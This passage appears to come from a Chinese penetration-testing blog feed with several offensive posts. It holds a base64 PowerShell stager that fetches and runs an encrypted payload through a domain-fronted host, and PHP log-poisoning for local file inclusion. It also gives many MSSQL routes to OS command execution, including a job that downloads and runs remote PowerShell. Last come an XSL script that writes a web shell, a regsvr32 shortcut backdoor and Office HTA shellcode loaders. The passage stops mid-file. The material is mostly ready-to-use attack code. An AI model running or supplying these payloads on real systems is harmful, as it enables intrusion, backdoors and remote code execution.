IABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAYwAuAEgARQBBAEQARQBSAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAUgBvAHgAWQA9AFsAUwBZAHMAVABFAG0ALgBOAGUAdAAuAFcARQBiAFIARQBxAFUAZQBTAFQAXQA6ADoARABlAEYAYQB1AEwAdABXAEUAQgBQAHIAbwBYAHkAOwAkAHcAYwAuAFAAUgBvAHgAeQAuAEMAUgBlAEQARQBOAHQAaQBhAEwAcwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBlAFQALgBDAHIAZQBEAGUAbgBUAEkAQQBsAEMAQQBjAGgAZQBdADoAOgBEAEUARgBhAFUAbAB0AE4ARQBUAHcATwByAGsAQwByAGUAZABlAG4AVABJAGEAbABTADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQBYAFQALgBFAG4AQwBvAGQASQBuAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AHQARQBzACgAJwBlADEAMABhAGQAYwAzADkANAA5AGIAYQA1ADkAYQBiAGIAZQA1ADYAZQAwADUANwBmADIAMABmADgAOAAzAGUAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAUgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AVQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AEMALgBIAEUAQQBEAGUAcgBzAC4AQQBkAGQAKAAiAEgAbwBzAHQAIgAsACIAZAAyADgAOQB3AHYAMwBiADUAdQB6ADMAbQBlAC4AYwBsAG8AdQBkAGYAcgBvAG4AdAAuAG4AZQB0ACIAKQA7ACQAVwBjAC4ASABFAEEAZABFAHIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AUgBTAHoAKwB5AEQAUABVAFEAcgBwAGwAVQBNAGQAbABKAEIAKwBVAEoAZwBEAHAAagB1AHcAPQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvAGMAZABuAC4AYQB6AC4AZwBvAHYAOgA4ADAAJwA7ACQAdAA9ACcALwBuAGUAdwBzAC4AYQBzAHAAJwA7ACQAZABBAHQAYQA9ACQAVwBDAC4ARABPAFcATgBsAG8AYQBEAEQAYQB0AEEAKAAkAHMARQByACsAJABUACkAOwAkAGkAVgA9ACQAZABBAHQAQQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQARABBAHQAQQBbADQALgAuACQARABBAFQAYQAuAEwARQBuAGcAdABIAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQBSAFsAXQBdACgAJgAgACQAUgAgACQARABhAFQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA 执行过程如下： 其DNS查询结果为： 开启的网络连接为： 0x05 小结使用此技巧可以有效地隐藏自己的真实地址，并且可以在一定程度上绕过某些防护，在渗透测试中应该是一个很不错的技术，希望此文对你有所帮助。 0x06 参考1、https://www.optiv.com/blog/escape-and-evasion-egressing-restricted-networks2、https://www.bamsoftware.com/papers/fronting/3、https://www.mdsec.co.uk/2017/02/domain-fronting-via-cloudfront-alternate-domains/4、https://www.xorrior.com/Empire-Domain-Fronting/]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>domain fronting</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LFI SSH日志]]></title>
    <url>%2Farchives%2FLFI.html</url>
    <content type="text"><![CDATA[登陆SSH：1ssh '&lt;?php system($_GET[‘c’]); ?&gt;'@192.168.1.105 包含文件：1http://192.168.1.105/lfi/lfi.php?file=/var/log/auth.log&amp;c=ls]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Exec OS Command Via MSSQL]]></title>
    <url>%2Farchives%2FExec_OS_Command_Via_MSSQL.html</url>
    <content type="text"><![CDATA[0x00 简介渗透测试过程中，大家经常会碰到通过MSSQL来进行提权或执行系统命令之类的操作，通常我们经常会使用xp_cmdshell来进行执行系统命令，但是当xp_cmdshell不能使用的时候，我们还有什么别的方式么？本文将介绍与分享一下我自己学到的一些姿势。 0x01 常用的一些姿势 1. XP_CMDSHELL这个大家都比较熟悉了，通过xp_cmdshell来执行命令，可使用以下语句来执行:1exec master..xp_cmdshell "whoami" 默认情况下xp_cmdshell 是禁止的，如下图： 这个时候，可以使用以下命令进行开启：1EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; 关闭一样,只是将上面的后面的那个”1”改成”0”就可以了。开启以后，则可执行系统命令 如果xp_cmdshell被删除，可以尝试上传xplog70.dll进行恢复，恢复语句：1Exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\xplog70.dll' 2. SP_OACREATE当xp_cmdshell 删除以后，可以使用SP_OACreate。首先要打开组件：12345EXEC sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'show advanced options', 0; 之后使用以下语句执行命令：1declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami &gt;d:\\temp\\1.txt' 这里要注意一下，此方式执行是无回显的 3. 自启动以下方式需要电脑重启。添加注册表：1xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\currentversion\run','exec','REG_SZ','ipconfig' 备份添加启动项：123456789alter database test set RECOVERY FULL-- (把SQL设置成日志完全恢复模式)create table cmd (a image)-- (新建立一个cmd表)backup database test to disk = 'D:\\temp\\cmd' WITH init --backup log test to disk = 'D:\\temp\\cmd1' WITH init -- (减少备分数据的大小)insert into cmd (a) values (0x0a406563686f206f66660d0a406563686f206f66660d0a40636d642e657865202f63206563686f2077686f616d69203e643a5c74656d705c332e7478740d0a40636d642e657865202f63206563686f2077686f616d69203e643a5c74656d705c332e7478740d0a400d0a40)-- (插入cmd命令)backup log test to disk = 'C:\\Documents and Settings\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\1.bat'-- (备分日志到启动路径）drop table cmd --(删除新建的cmd表）alter database test set RECOVERY SIMPLE--(把SQL设置成日志简单恢复模式) 测试发现，Win10+MSSQL 2012导出的批处理并不能顺利执行，可能与系统及数据库版本有一定关系，成功率并不怎么高。 4. 通过沙盒执行命令开启沙盒：1exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1 然后利用jet.oledb执行命令：1select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\dnary.mdb','select shell("whoami")') 0x02 通过Agent Job执行命令此种方式适用于服务器开启了MSSQL Agent Job服务，并且服务器中当前运行的用户账号拥有足够的权限去创建并执行代理作业的情况。利用代码如下：1USE msdb; EXEC dbo.sp_add_job @job_name = N'test_powershell_job1' ; EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(''http://IP_OR_HOSTNAME/file''))"', @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; EXEC dbo.sp_start_job N'test_powershell_job1'; 关于此种方式已经有文章进行介绍，有兴趣可以阅读一下。戳我 0x03 SQL Server CLR这种方式是最近才学到的，也是本文重点介绍的一种姿势。Microsoft SQL Server 现在具备与 Microsoft Windows .NET Framework 的公共语言运行时 (CLR) 组件集成的功能。CLR 为托管代码提供服务，例如跨语言集成、代码访问安全性、对象生存期管理以及调试和分析支持。对于 SQL Server 用户和应用程序开发人员来说，CLR 集成意味着您现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）编写存储过程、触发器、用户定义类型、用户定义函数（标量函数和表值函数）以及用户定义的聚合函数。要通过此种方式来执行命令，也有几个前提：1、在SQL Server上能启用CLR并可以创建自定义存储过程2、SQL Server当前账号具有执行命令/代码所需要的权限创建CLR有两种方式:方式一：使用DLL文件进行创建1CREATE ASSEMBLY AssemblyName from ‘DLLPath’ 方式二：使用文件16进制流进行创建1CREATE ASSEMBLY AssemblyName from 文件十六进制流 对于做渗透的我们，当然是没有文件是最好的方式了，因此，本文主要介绍方式二。以下为详细测试步骤：1、安装Visual Studio和SQL Server数据库，此次测试使用了VS2015跟SQL2012。2、创建一个新的SQL Server数据库项目 3、设置项目属性，目标平台修改为需要的目标平台，如SQL Server 2012; 将SQLCLR权限级别修改为UNSAFE；修改.Net 框架版本为自己需要的版本；语言选择C#。 4、右键项目，选择添加-&gt;新建项，新建SQL CLR C# 存储过程 5、填入以下测试代码：12345678910111213141516171819202122using System;using System.Data;using System.Data.SqlClient;using System.Data.SqlTypes;using Microsoft.SqlServer.Server;using System.Collections.Generic;using System.Text;using System.Threading.Tasks;public partial class StoredProcedures&#123; [Microsoft.SqlServer.Server.SqlProcedure] public static void SqlStoredProcedure1 () &#123; // 在此处放置代码 System.Diagnostics.Process process = new System.Diagnostics.Process(); process.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden; process.StartInfo.FileName = "cmd.exe"; process.StartInfo.Arguments = "/C whoami &gt; d:\\temp\\1.txt"; process.Start(); &#125;&#125; 6、填入代码以后进行编译，之后到编译目录下可以看到一个dacpac后缀的文件。 7、双击此文件进行解压，将解压出一个名为mode.sql的文件。8、执行SQL文件中的以下语句1234CREATE ASSEMBLY [ExecCode] AUTHORIZATION [dbo] FROM 0x4D5A[...snip...] WITH PERMISSION_SET = UNSAFE; 之后执行：12CREATE PROCEDURE [dbo].[SqlStoredProcedure1]AS EXTERNAL NAME [ExecCode].[StoredProcedures].[SqlStoredProcedure1] 9、开启数据库服务器配置选项clr enabled1234567891011EXEC sp_configure N'show advanced options', N'1' RECONFIGURE WITH OVERRIDE--开启clr enabled 选项EXEC sp_configure N'clr enabled', N'1'RECONFIGURE WITH OVERRIDE --关闭所有服务器配置选项EXEC sp_configure N'show advanced options', N'0' RECONFIGURE WITH OVERRIDE--如果存在权限问题，执行下面一段脚本alter database [master] set TRUSTWORTHY onEXEC sp_changedbowner 'sa' 10、执行命令：1EXEC [dbo].[SqlStoredProcedure1]; 如果没成功，可以换个数据库试试看。 11、删除存储过程12DROP PROCEDURE [dbo].[SqlStoredProcedure1];DROP ASSEMBLY ExecCode; 0x04 PowerUpSQL当然针对SQL Server的攻击，有一个强大的工具PowerUpSQL，里面也有很多针对MSSQL的攻击方式。下面介绍两种比较实用的方式。 1. SP_Addextendedproc套件中的Create-SQLFileXpDll方法，在这里对其使用方式简单的进行一下介绍。创建DLL：123PS C:\Users\Evi1cg\Desktop\PowerUpSQL&gt; . .\PowerUpSQL.ps1PS C:\Users\Evi1cg\Desktop\PowerUpSQL&gt; Create-SQLFileXpDll -OutFile D:\temp\exec.dll -Command "echo Exec test &gt; D:\temp\test.txt" -ExportName xp_test SQL Server 通过 sp_addextendedproc 调用DLL从而达到命令执行的效果。这里有两种方式导入：1234//via local disksp_addextendedproc 'xp_test', 'D:\temp\exec.dll'//via UNC path:sp_addextendedproc 'xp_test', '\\servername\pathtofile\exec.dll' 导入之后的可调用xp_test来执行命令：1exec master..xp_test; 通过以下命令可以卸载：1sp_dropextendedproc 'xp_test' 2. SMB Relay Attacks针对这种方式，已经有文章总结了，这里就不多做介绍了，详细请看这里。 0x05 小结本文就通过SQL Server 执行系统命令进行了一下小结，当然方式可能不全，仅仅是自己知道的一些方法，还希望大牛别喷，如果您有什么更加新颖的方法，欢迎补充，希望本文对你有所帮助。 0x06 参考1.http://bobao.360.cn/learning/detail/3070.html2.https://www.mssqltips.com/sqlservertip/2087/how-to-execute-a-dos-command-when-xpcmdshell-is-disabled-in-sql-server/3.http://blog.csdn.net/tjvictor/article/details/47269334.https://www.mssqltips.com/sqlservertip/1662/writing-to-an-operating-system-file-using-the-sql-server-sqlclr/5.https://www.t00ls.net/viewthread.php?tid=23198&amp;extra=page%3D1%26amp%3Bfilter%3Dtype%26amp%3Btypeid%3D39]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>mssql</tag>
        <tag>exec command</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XXE with XSL]]></title>
    <url>%2Farchives%2Fxxe_with_xsl.html</url>
    <content type="text"><![CDATA[当XXE支持XSL时，可以直接执行命令：写shell123456789101112131415161718192021&lt;?xml version='1.0'?&gt;&lt;xsl:stylesheet version="1.0"xmlns:xsl="http://www.w3.org/1999/XSL/Transform"xmlns:msxsl="urn:schemas-microsoft-com:xslt"xmlns:user="http://mycompany.com/mynamespace"&gt;&lt;msxsl:script language="C#" implements-prefix="user"&gt;&lt;![CDATA[public string xml()&#123; System.Net.WebClient webClient = new System.Net.WebClient(); webClient.DownloadFile("https://x.x.x.x/shell.txt", @"c:\inetpub\wwwroot\shell.aspx"); return "Exploit Success";&#125;]]&gt;&lt;/msxsl:script&gt;&lt;xsl:template match="/"&gt;&lt;xsl:value-of select="user:xml()"/&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Shortcut Backdoor]]></title>
    <url>%2Farchives%2FShortcut_Backdoor.html</url>
    <content type="text"><![CDATA[PS code:12345678$file = Get-Content "C:\Users\evi1cg\Desktop\backdoor\link\test.txt"$WshShell = New-Object -comObject WScript.Shell$Shortcut = $WshShell.CreateShortcut("C:\Users\evi1cg\Desktop\backdoor\link\计算机.lnk")$Shortcut.TargetPath = "%SystemRoot%\system32\cmd.exe"$Shortcut.WindowStyle = 7$Shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,15"$Shortcut.Arguments = ' '+ $file$Shortcut.Save() test.txt:1/c explorer.exe /e,::&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125; | regsvr32.exe /u /s /i:https://evi1cg.github.io/scripts/calc.png scrobj.dll DEMO: 写了一个自动化的脚本，地址如下： https://gist.github.com/Ridter/a360f94d8ac9a8c30227e3812dfbb329 DEMO：]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Office Shellcode Execution]]></title>
    <url>%2Farchives%2FOffice_Shellcode_Execution.html</url>
    <content type="text"><![CDATA[From: https://gist.github.com/subTee/e126c6ee847a4d9fcfd7CalcExcel.hta1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;html&gt; &lt;head&gt; &lt;script&gt; var objExcel = new ActiveXObject("Excel.Application"); objExcel.Visible = false; var WshShell = new ActiveXObject("WScript.Shell"); var Application_Version = objExcel.Version;//Auto-Detect Version var strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + Application_Version + "\\Excel\\Security\\AccessVBOM"; WshShell.RegWrite(strRegPath, 1, "REG_DWORD"); var objWorkbook = objExcel.Workbooks.Add(); var xlmodule = objWorkbook.VBProject.VBComponents.Add(1); strCode = '#If Vba7 Then\n' strCode += 'Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As LongPtr, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As LongPtr\n' strCode += 'Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As LongPtr\n' strCode += 'Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As LongPtr, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As LongPtr\n' strCode += '#Else\n' strCode += 'Private Declare Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As Long, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As Long\n' strCode += 'Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As Long\n' strCode += 'Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As Long, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As Long\n' strCode += '#EndIf\n' strCode += '\n' strCode += 'Sub ExecShell()\n' strCode += ' Dim Wyzayxya As Long, Hyeyhafxp As Variant, Lezhtplzi As Long, Zolde As Long\n' strCode += '#If Vba7 Then\n' strCode += ' Dim Xlbufvetp As LongPtr\n' strCode += '#Else\n' strCode += ' Dim Xlbufvetp As Long\n' strCode += '#EndIf\n' strCode += ' Hyeyhafxp = Array(232,137,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20, _\n' strCode += '139,114,40,15,183,74,38,49,255,49,192,172,60,97,124,2,44,32,193,207, _\n' strCode += '13,1,199,226,240,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192, _\n' strCode += '116,74,1,208,80,139,72,24,139,88,32,1,211,227,60,73,139,52,139,1, _\n' strCode += '214,49,255,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125, _\n' strCode += '36,117,226,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4, _\n' strCode += '139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18, _\n' strCode += '235,134,93,106,1,141,133,185,0,0,0,80,104,49,139,111,135,255,213,187, _\n' strCode += '224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5, _\n' strCode += '187,71,19,114,111,106,0,83,255,213,99,97,108,99,0)\n' strCode += ' Xlbufvetp = VirtualAlloc(0, UBound(Hyeyhafxp), &amp;H1000, &amp;H40)\n' strCode += ' For Zolde = LBound(Hyeyhafxp) To UBound(Hyeyhafxp)\n' strCode += ' Wyzayxya = Hyeyhafxp(Zolde)\n' strCode += ' Lezhtplzi = RtlMoveMemory(Xlbufvetp + Zolde, Wyzayxya, 1)\n' strCode += ' Next Zolde\n' strCode += ' Lezhtplzi = CreateThread(0, 0, Xlbufvetp, 0, 0, 0)\n' strCode += 'End Sub\n' xlmodule.CodeModule.AddFromString(strCode); objExcel.Run("ExecShell"); objExcel.DisplayAlerts = false; objWorkbook.Close(false); close(); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; Thank you. You may close this window. &lt;/body&gt;&lt;/html&gt; CalcPPT.hta 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;html&gt; &lt;head&gt; &lt;script&gt; var objPPT = new ActiveXObject("PowerPoint.Application"); objPPT.Visible = true; var WshShell = new ActiveXObject("WScript.Shell"); var Application_Version = objPPT.Version;//Auto-Detect Version var strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + Application_Version + "\\PowerPoint\\Security\\AccessVBOM"; WshShell.RegWrite(strRegPath, 1, "REG_DWORD"); var objPreso = objPPT.Presentations.Add(); var pptmodule = objPreso.VBProject.VBComponents.Add(1); strCode = '#If Vba7 Then\n' strCode += 'Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As LongPtr, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As LongPtr\n' strCode += 'Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As LongPtr\n' strCode += 'Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As LongPtr, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As LongPtr\n' strCode += '#Else\n' strCode += 'Private Declare Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As Long, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As Long\n' strCode += 'Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As Long\n' strCode += 'Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As Long, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As Long\n' strCode += '#EndIf\n' strCode += '\n' strCode += 'Public Sub ExecShell()\n' strCode += ' Dim Wyzayxya As Long, Hyeyhafxp As Variant, Lezhtplzi As Long, Zolde As Long\n' strCode += '#If Vba7 Then\n' strCode += ' Dim Xlbufvetp As LongPtr\n' strCode += '#Else\n' strCode += ' Dim Xlbufvetp As Long\n' strCode += '#EndIf\n' strCode += ' Hyeyhafxp = Array(232,137,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20, _\n' strCode += '139,114,40,15,183,74,38,49,255,49,192,172,60,97,124,2,44,32,193,207, _\n' strCode += '13,1,199,226,240,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192, _\n' strCode += '116,74,1,208,80,139,72,24,139,88,32,1,211,227,60,73,139,52,139,1, _\n' strCode += '214,49,255,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125, _\n' strCode += '36,117,226,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4, _\n' strCode += '139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18, _\n' strCode += '235,134,93,106,1,141,133,185,0,0,0,80,104,49,139,111,135,255,213,187, _\n' strCode += '224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5, _\n' strCode += '187,71,19,114,111,106,0,83,255,213,99,97,108,99,0)\n' strCode += ' Xlbufvetp = VirtualAlloc(0, UBound(Hyeyhafxp), &amp;H1000, &amp;H40)\n' strCode += ' For Zolde = LBound(Hyeyhafxp) To UBound(Hyeyhafxp)\n' strCode += ' Wyzayxya = Hyeyhafxp(Zolde)\n' strCode += ' Lezhtplzi = RtlMoveMemory(Xlbufvetp + Zolde, Wyzayxya, 1)\n' strCode += ' Next Zolde\n' strCode += ' Lezhtplzi = CreateThread(0, 0, Xlbufvetp, 0, 0, 0)\n' strCode += 'End Sub\n' pptmodule.CodeModule.AddFromString(strCode); objPPT.Run("ExecShell"); objPPT.DisplayAlerts = false; objPPT.Quit(); close(); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; Thank you. You may close this window. &lt;/body&gt;&lt;/html&gt; CalcWord.hta1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;html&gt; &lt;head&gt; &lt;script&gt; var objWord = new ActiveXObject("Word.Application"); objWord.Visible = false; var WshShell = new ActiveXObject("WScript.Shell"); var Application_Version = objWord.Version;//Auto-Detect Version var strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + Application_Version + "\\Word\\Security\\AccessVBOM"; WshShell.RegWrite(strRegPath, 1, "REG_DWORD"); var objDoc = objWord.Documents.Add(); var wdmodule = objDoc.VBProject.VBComponents.Add(1); strCode = '#If Vba7 Then\n' strCode += 'Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As LongPtr, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As LongPtr\n' strCode += 'Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As LongPtr\n' strCode += 'Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As LongPtr, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As LongPtr\n' strCode += '#Else\n' strCode += 'Private Declare Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As Long, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As Long\n' strCode += 'Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As Long\n' strCode += 'Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As Long, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As Long\n' strCode += '#EndIf\n' strCode += '\n' strCode += 'Sub ExecShell()\n' strCode += ' Dim Wyzayxya As Long, Hyeyhafxp As Variant, Lezhtplzi As Long, Zolde As Long\n' strCode += '#If Vba7 Then\n' strCode += ' Dim Xlbufvetp As LongPtr\n' strCode += '#Else\n' strCode += ' Dim Xlbufvetp As Long\n' strCode += '#EndIf\n' strCode += ' Hyeyhafxp = Array(232,137,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20, _\n' strCode += '139,114,40,15,183,74,38,49,255,49,192,172,60,97,124,2,44,32,193,207, _\n' strCode += '13,1,199,226,240,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192, _\n' strCode += '116,74,1,208,80,139,72,24,139,88,32,1,211,227,60,73,139,52,139,1, _\n' strCode += '214,49,255,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125, _\n' strCode += '36,117,226,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4, _\n' strCode += '139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18, _\n' strCode += '235,134,93,106,1,141,133,185,0,0,0,80,104,49,139,111,135,255,213,187, _\n' strCode += '224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5, _\n' strCode += '187,71,19,114,111,106,0,83,255,213,99,97,108,99,0)\n' strCode += ' Xlbufvetp = VirtualAlloc(0, UBound(Hyeyhafxp), &amp;H1000, &amp;H40)\n' strCode += ' For Zolde = LBound(Hyeyhafxp) To UBound(Hyeyhafxp)\n' strCode += ' Wyzayxya = Hyeyhafxp(Zolde)\n' strCode += ' Lezhtplzi = RtlMoveMemory(Xlbufvetp + Zolde, Wyzayxya, 1)\n' strCode += ' Next Zolde\n' strCode += ' Lezhtplzi = CreateThread(0, 0, Xlbufvetp, 0, 0, 0)\n' strCode += 'End Sub\n' wdmodule.CodeModule.AddFromString(strCode); objWord.Run("ExecShell"); objWord.DisplayAlerts = false; objDoc.Close(false); //close(); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; Thank you. You may close this window. &lt;/body&gt;&lt;/html&gt; calc.sct12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?XML version="1.0"?&gt;&lt;scriptlet&gt;&lt;registration progid="CalcShellcode" classid="&#123;F0001111-0000-0000-0000-0000FEEDACDC&#125;" &gt; &lt;!-- Proof Of Concept - Casey Smith @subTee --&gt; &lt;!-- Orginal Shellcode Example : https://www.scriptjunkie.us/2012/01/direct-shellcode-execution-in-ms-office-macros/ --&gt; &lt;script language="JScript"&gt; &lt;![CDATA[ var objExcel = new ActiveXObject("Excel.Application"); objExcel.Visible = false; var WshShell = new ActiveXObject("WScript.Shell"); var Application_Version = objExcel.Version;//Auto-Detect Version var strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + Application_Version + "\\Excel\\Security\\AccessVBOM"; WshShell.RegWrite(strRegPath, 1, "REG_DWORD"); var objWorkbook = objExcel.Workbooks.Add(); var xlmodule = objWorkbook.VBProject.VBComponents.Add(1); strCode = '#If Vba7 Then\n' strCode += 'Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As LongPtr, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As LongPtr\n' strCode += 'Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As LongPtr\n' strCode += 'Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As LongPtr, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As LongPtr\n' strCode += '#Else\n' strCode += 'Private Declare Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As Long, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As Long\n' strCode += 'Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As Long\n' strCode += 'Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As Long, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As Long\n' strCode += '#EndIf\n' strCode += '\n' strCode += 'Sub ExecShell()\n' strCode += ' Dim Wyzayxya As Long, Hyeyhafxp As Variant, Lezhtplzi As Long, Zolde As Long\n' strCode += '#If Vba7 Then\n' strCode += ' Dim Xlbufvetp As LongPtr\n' strCode += '#Else\n' strCode += ' Dim Xlbufvetp As Long\n' strCode += '#EndIf\n' strCode += ' 